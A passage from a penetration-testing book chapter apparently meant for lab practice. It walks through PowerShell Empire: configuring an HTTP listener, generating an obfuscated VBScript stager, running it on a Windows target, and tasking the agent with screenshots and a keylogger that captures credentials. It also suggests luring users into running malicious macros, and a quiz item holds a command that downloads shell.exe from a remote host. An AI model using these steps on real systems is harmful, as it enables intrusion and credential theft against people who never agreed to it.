<p>Now, type <strong class="source-inline">uselistener</strong> with a space on the end to show the available listeners. The HTTP listener sounds like a good idea – port <strong class="source-inline">80</strong> tends to be open on firewalls. Complete the <strong class="source-inline">uselistener/http</strong> command and then check the options with <strong class="source-inline">info</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer205">
<img alt="Figure 9.20 – The interface for a specific listener " height="189" src="image/Figure_9.20_B17616.jpg" width="944"/>
</div>
</div>
<p class="figure-caption">Figure 9.20 – The interface for a specific listener</p>
<p>If this isn’t looking familiar to you yet, now you’ll see the interface smacks of Metasploit. Isn’t it cozy? It kind of makes me want to curl up with some hot cocoa.</p>
<p>You’ll notice the options default to everything you need, so you could just fire off <strong class="source-inline">execute</strong> to set it up. There are a lot of options, though, so consider your environment and goals. If you change the host to HTTPS, Empire will configure it accordingly on the backend, but <a id="_idIndexMarker734"/>you’ll need a certificate. Empire comes with a self-signed certificate generator that will place the result in the correct folder – run <strong class="source-inline">cert.sh</strong> from within the <strong class="source-inline">setup</strong> folder. For now, I’m using plain HTTP. You’ll need to configure the listening port with <strong class="source-inline">set Port 80</strong>. Once you execute it, type <strong class="source-inline">main</strong> to go back to the main Empire prompt. Notice that the <strong class="source-inline">listeners</strong> count is now <strong class="source-inline">1</strong>. Now, let’s learn how to configure stagers.</p>
<h2 id="_idParaDest-182"><a id="_idTextAnchor181"/>Configuring stagers</h2>
<p>Type <strong class="source-inline">usestager</strong> with a <a id="_idIndexMarker735"/>space on the end to see the stagers that are available to us:</p>
<div>
<div class="IMG---Figure" id="_idContainer206">
<img alt="Figure 9.21 – Autocomplete with usestager " height="285" src="image/Figure_9.21_B17616.jpg" width="657"/>
</div>
</div>
<p class="figure-caption">Figure 9.21 – Autocomplete with usestager</p>
<p>As you can see, there’s social engineering potential here; I’ll leave it to your creativity to develop ways to convince users to execute a malicious macro that’s embedded in a Word document. Such attacks are still prevalent even at the time of writing, and unfortunately, we sometimes see them getting through. For now, I’m going with the VBScript stager, so I’ll complete the <strong class="source-inline">usestager windows/launcher_vbs</strong> command. We will immediately see our options menu. There are two important things to note when configuring options:</p>
<ul>
<li>The stager has to know which listener to associate with. You define it here by name; in the old days, you had to make a note of the listener’s name when you first created it. Now, putting a space after <strong class="source-inline">set Listener</strong> will automatically give you a list of the existing listeners.</li>
<li>These options are case-sensitive.</li>
</ul>
<p>There are <a id="_idIndexMarker736"/>some great options and they’re shown in the following table. My favorite is the code obfuscation feature. I encourage you to play around with this option and try to review the resulting code (obfuscation requires PowerShell to be installed locally):</p>
<div>
<div class="IMG---Figure" id="_idContainer207">
<img alt="Figure 9.22 – Stager options menu " height="917" src="image/Figure_9.22_B17616.jpg" width="1137"/>
</div>
</div>
<p class="figure-caption">Figure 9.22 – Stager options menu</p>
<p>Once you’re ready, fire off <strong class="source-inline">execute</strong> to generate the stager. You’ll find the resulting VBSript file under <strong class="source-inline">/var/lib/powershell-empire/empire/client/generated-stagers</strong>.</p>
<p>Go ahead <a id="_idIndexMarker737"/>and crack open your fancy new stager. Let’s take a look inside.</p>
<h2 id="_idParaDest-183"><a id="_idTextAnchor182"/>Your inside guy – working with agents</h2>
<p>Did you <a id="_idIndexMarker738"/>check out the VBScript? It’s pretty nifty. Check it out: <strong class="source-inline">vim /var/lib/powershell-empire/empire/client/generated-stagers/launcher.vbs</strong>. Even though we didn’t configure obfuscation for the actual PowerShell, the purpose of this VBScript is hard to determine, as you can see:</p>
<div>
<div class="IMG---Figure" id="_idContainer208">
<img alt="Figure 9.23 – Taking a peek inside the VBScript stager " height="929" src="image/Figure_9.23_B17616.jpg" width="1199"/>
</div>
</div>
<p class="figure-caption">Figure 9.23 – Taking a peek inside the VBScript stager</p>
<p>Regardless of what method you chose, we’re working in a three-stage agent delivery process with Empire. The stager is what opens the door; Empire takes care of the agent’s travels, as shown in the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer209">
<img alt="Figure 9.24 – The three-stage agent delivery process " height="796" src="image/Figure_9.24_B17616.jpg" width="1511"/>
</div>
</div>
<p class="figure-caption">Figure 9.24 – The three-stage agent delivery process</p>
<p>When you <a id="_idIndexMarker739"/>execute the stager on your Windows target, you won’t see anything happen. Look at your Empire screen, though, and watch the three-stage agent delivery process complete. The agent-attacker relationship is similar to a Meterpreter session and is managed similarly. Type <strong class="source-inline">agents</strong> to enter the <strong class="source-inline">agents</strong> menu and then use <strong class="source-inline">interact</strong> to talk to the particular agent that just got set up:</p>
<div>
<div class="IMG---Figure" id="_idContainer210">
<img alt="Figure 9.25 – Active agent ready to be tasked " height="144" src="image/Figure_9.25_B17616.jpg" width="1184"/>
</div>
</div>
<p class="figure-caption">Figure 9.25 – Active agent ready to be tasked</p>
<p>As always, use <strong class="source-inline">help</strong> to find out what interaction options are available to you. For now, let’s grab a screenshot from the target with <strong class="source-inline">sc</strong>. The client window will simply tell you that it tasked the agent, but you can switch back to the server window to see some of the behind-the-scenes details:</p>
<div>
<div class="IMG---Figure" id="_idContainer211">
<img alt="Figure 9.26 – Details of a task in the server window " height="198" src="image/Figure_9.26_B17616.jpg" width="1048"/>
</div>
</div>
<p class="figure-caption">Figure 9.26 – Details of a task in the server window</p>
<p>You’ll find <a id="_idIndexMarker740"/>your loot in <strong class="source-inline">/var/lib/powershell-empire/downloads</strong>. A screenshot is fun, but passwords will be visually obfuscated, so let’s wrap up our introduction with a PowerShell keylogging module.</p>
<h2 id="_idParaDest-184"><a id="_idTextAnchor183"/>Configuring a module for agent tasking</h2>
<p>First, enter agents mode by entering the <strong class="source-inline">agents</strong> command. Execute <strong class="source-inline">usemodule powershell/collection/keylogger</strong>, followed by <strong class="source-inline">set Agent</strong> with the name you just <a id="_idIndexMarker741"/>noted. Fire off <strong class="source-inline">execute</strong> and sit back as your agent behind enemy lines gets to work. Back in your <strong class="source-inline">interact</strong> session, use the <strong class="source-inline">view</strong> command to see how things are coming along with your tasks.</p>
<p>I would be happy to write a big, complicated paragraph detailing all of the moving parts, but it’s that simple to configure a basic module and task an agent with it. The Empire framework is just too handy to limit to this introductory chapter – we have some work in escalation and persistence to do, so keep this fantastic tool close at hand. Check out the result from this lab: we captured some credentials, and the agent was nice enough to give us the title of the page where it was entered:</p>
<div>
<div class="IMG---Figure" id="_idContainer212">
<img alt="Figure 9.27 – Captured keystrokes sent by the Empire agent " height="497" src="image/Figure_9.27_B17616.jpg" width="1513"/>
</div>
</div>
<p class="figure-caption">Figure 9.27 – Captured keystrokes sent by the Empire agent</p>
<p>Just like when we were configuring listeners and stagers, we have optional settings and some that are required, and Empire does its best to configure them for you in advance. Carefully review the available options before tasking your agent with the module.</p>
<p>In a <a id="_idIndexMarker742"/>modern Windows enterprise environment, PowerShell is the ultimate “live off the land” tool at our disposal, and the Empire framework has the power to make you a ninja at your assessments. If you followed along with these labs, you already have the foundation to explore deeper, so crack open that target VM and try out some new tricks. We’ll be playing with Empire during our post-exploitation work, so stay tuned.</p>
<h1 id="_idParaDest-185"><a id="_idTextAnchor184"/>Summary</h1>
<p>In this chapter, we explored PowerShell from two perspectives. First, we introduced PowerShell as an interactive task management command-line utility and as a scripting language. Then, we leveraged PowerShell scripts built into the PowerShell Empire attack framework as a way of demonstrating the potential when attacking Windows machines. Ultimately, we learned how to leverage a foothold on a Windows machine using built-in functionality to prepare for later stages of the attack.</p>
<p>This introduction is an ideal segue into the concepts of privilege escalation and persistence, where we’ll turn our foothold into a fully privileged compromise and pave the way to maintain our access to facilitate the project in the long term. For now, we’ll jump into the next chapter where we introduce shellcoding and take a crash course in manipulating the stack.</p>
<h1 id="_idParaDest-186"><a id="_idTextAnchor185"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li value="1"><strong class="source-inline">ls</strong>, <strong class="source-inline">dir</strong>, and PowerShell’s _____ provide the same functionality.</li>
<li>What does <strong class="source-inline">[Convert]::ToString($number, 2)</strong> do to the <strong class="source-inline">$number</strong> variable?</li>
<li>In PowerShell, we grep out results with ____.</li>
<li>The following command will create the <strong class="source-inline">c:\shell</strong> directory to write <strong class="source-inline">shell.exe</strong> to it (True | False):<p class="source-code">(New-Object System.Net.WebClient).DownloadFile("http://10.10.0.2/shell.exe", "c:\shell\shell.exe")</p></li>
<li>When configuring an HTTPS listener, you can use the <strong class="source-inline">cert.sh</strong> script to prevent the target browser from displaying a certificate alert. (True | False)</li>
</ol>
<h1 id="_idParaDest-187"><a id="_idTextAnchor186"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li>Empire Project on GitHub: <a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li>
<li>Microsoft Virtual Academy: PowerShell training: <a href="https://mva.microsoft.com/training-topics/powershell#!lang=1033">https://mva.microsoft.com/training-topics/powershell#!lang=1033</a></li>
</ul>
</div>
</div></body></html>